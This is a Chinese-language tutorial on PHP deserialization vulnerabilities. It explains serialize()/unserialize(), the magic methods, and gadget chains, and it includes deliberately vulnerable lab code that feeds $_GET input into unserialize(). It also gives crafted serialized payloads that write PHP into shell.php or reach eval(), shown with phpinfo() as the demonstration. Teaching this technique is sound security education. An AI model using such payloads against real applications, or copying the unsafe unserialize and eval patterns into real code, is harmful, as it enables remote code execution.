# PHP 反序列化漏洞

## 序列化与反序列化

php中有两个函数[serialize\(\)](http://php.net/manual/zh/function.serialize.php) 和[unserialize\(\)](http://php.net/manual/zh/function.unserialize.php)。

### serialize\(\)

当在php中创建了一个对象后，可以通过serialize\(\)把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下；

```php
<?php
class chybeta{
    var $test = '123';
}

$class1 = new chybeta;
$class1_ser = serialize($class1);
print_r($class1_ser);
?>
```

这边我们创建了一个新的对象，并且将其序列化后的结果打印出来：

```text
O:7:"chybeta":1:{s:4:"test";s:3:"123";}
```

这里的`O`代表存储的是对象（object）,假如你给serialize\(\)传入的是一个数组，那它会变成字母a。`7`表示对象的名称有7个字符。`"chybeta"`表示对象的名称。`1`表示有一个值。`{s:4:"test";s:3:"123";}`中，`s`表示字符串，`4`表示该字符串的长度，`"test"`为字符串的名称，之后的类似。

### unserialize\(\)

与 serialize\(\) 对应的，unserialize\(\)可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。

```php
<?php
class chybeta{
    var $test = '123';
}

$class2 = 'O:7:"chybeta":1:{s:4:"test";s:3:"123";}';    print_r($class2);
echo "</br>";

$class2_unser = unserialize($class2);
print_r($class2_ser);

?>
```

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/1.jpg?raw=true)

这里提醒一下，当使用 unserialize\(\) 恢复对象时， 将调用 \_\_wakeup\(\) 成员函数。

## 反序列化漏洞

由前面可以看出，当传给 unserialize\(\) 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。

### 利用构造函数等

#### Magic function

php中有一类特殊的方法叫“[Magic function](https://secure.php.net/manual/zh/language.oop5.magic.php)”， 这里我们着重关注一下几个：

* 构造函数\_\_construct\(\)：当对象创建\(new\)时会自动调用。但在unserialize\(\)时是不会自动调用的。
* 析构函数\_\_destruct\(\)：当对象被销毁时会自动调用。
* \_\_wakeup\(\) ：如前所提，unserialize\(\)时会自动调用。

测试如下：

```php
<?php
class chybeta{
    var $test = '123';
    function __wakeup(){
        echo "__wakeup";
        echo "</br>";
    }
    function __construct(){
        echo "__construct";
        echo "</br>";
    }
    function __destruct(){
        echo "__destruct";
        echo "</br>";
    }
}
$class2 = 'O:7:"chybeta":1:{s:4:"test";s:3:"123";}';
    print_r($class2);
echo "</br>";

$class2_unser = unserialize($class2);
print_r($class2_unser);
echo "</br>";

?>
```

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/2.jpg?raw=true)

#### 利用场景

**\_\_wakeup\(\) 或\_\_destruct\(\)**

由前可以看到，unserialize\(\)后会导致\_\_wakeup\(\) 或\_\_destruct\(\)的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在\_\_wakeup\(\) 或\_\_destruct\(\)中，从而当我们控制序列化字符串时可以去直接触发它们。这里针对 \_\_wakeup\(\) 场景做个实验。假设index源码如下：

```php
<?php
class chybeta{
    var $test = '123';
    function __wakeup(){
        $fp = fopen("shell.php","w") ;
        fwrite($fp,$this->test);
        fclose($fp);
    }
}

$class3 = $_GET['test'];
print_r($class3);
echo "</br>";
$class3_unser = unserialize($class3);

require "shell.php";
// 为显示效果，把这个shell.php包含进来
?>
```

同目录下有个空的shell.php文件。一开始访问index.php。

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/3.jpg?raw=true)

基本的思路是，本地搭建好环境，通过 serialize\(\) 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 "&lt;?php phpinfo\(\); ?&gt;",再调用unserialize\(\)时会通过\_\_wakeup\(\)把test的写入到shell.php中。为此我们写个php脚本：

```php
<?php
class chybeta{
    var $test = '123';
    function __wakeup(){
        $fp = fopen("shell.php","w") ;
        fwrite($fp,$this->test);
        fclose($fp);
    }
}
$class4 = new chybeta();
$class4->test = "<?php phpinfo(); ?>";    $class4_ser = serialize($class4);    print_r($class4_ser);
?>
```

由此得到序列化结果：

```text
O:7:"chybeta":1:{s:4:"test";s:19:"<?php phpinfo(); ?>";}
```

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/4.jpg?raw=true)

**其他Magic function的利用**

但如果一次unserialize\(\)中并不会直接调用的魔术函数，比如前面提到的\_\_construct\(\)，是不是就没有利用价值呢？非也。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的\_\_wakeup\(\)中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。

```php
<?php

class ph0en1x{
    function __construct($test){
        $fp = fopen("shell.php","w") ;
        fwrite($fp,$test);
        fclose($fp);
    }
}
class chybeta{
    var $test = '123';
    function __wakeup(){
        $obj = new ph0en1x($this->test);
    }

}

$class5 = $_GET['test'];
print_r($class5);
echo "</br>";
$class5_unser = unserialize($class5);

require "shell.php";
?>
```

这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 \_\_wakeup\(\)函数，从而在new ph0en1x\(\)会自动调用对象ph0en1x中的\_\_construct\(\)方法，从而把`<?php phpinfo() ?>`写入到 shell.php中。

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/5.jpg?raw=true)

### 利用普通成员方法

前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。

```php
<?php

class chybeta {
    var $test;
    function __construct() {
        $this->test = new ph0en1x();
    }

    function __destruct() {
        $this->test->action();
    }
}

class ph0en1x {
    function action() {
        echo "ph0en1x";
    }
}

class ph0en2x {
    var $test2;
    function action() {
        eval($this->test2);
    }
}

$class6 = new chybeta();

unserialize($_GET['test']);

?>
```

本意上，new一个新的chybeta对象后，调用\_\_construct\(\)，其中又new了ph0en1x对象。在结束后会调用\_\_destruct\(\)，其中会调用action\(\)，从而输出 ph0en1x。

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/6.jpg?raw=true)

下面是利用过程。构造序列化。

```text
<?php
class chybeta {
    var $test;

    function __construct() {
        $this->test = new ph0en2x();
    }

}
class ph0en2x {
    var $test2 = "phpinfo();";

}
echo serialize(new chybeta());
?>
```

得到：

```text
O:7:"chybeta":1:{s:4:"test";O:7:"ph0en2x":1:{s:5:"test2";s:10:"phpinfo();";}}
```

传给index.php的test参数，利用成功：

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/7.jpg?raw=true)

